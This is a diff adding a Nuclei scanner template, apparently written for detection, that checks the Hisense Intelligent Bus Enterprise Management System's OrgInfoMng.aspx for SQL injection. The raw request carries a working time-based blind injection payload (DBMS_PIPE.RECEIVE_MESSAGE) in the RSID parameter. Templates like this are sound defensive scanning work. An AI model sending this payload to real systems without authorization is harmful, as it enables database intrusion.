@@ -1,0 +1,33 @@
+id: hisense-transtech-orginfomng-sqli
+info:
+  name: SQL Injection in OrgInfoMng.aspx
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects a SQL injection vulnerability in the Hisense Intelligent Bus Enterprise Management System's OrgInfoMng.aspx endpoint.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1)+2}}"
+
+http:
+  - raw:
+      - |
+        GET /Erp/ErpAdmin/Form/OrgInfoMng.aspx?RSID=1'and+1=(DBMS_PIPE.RECEIVE_MESSAGE('a',{{t1}}))+and+'1'='1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Error Report"
+          - "SQL"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
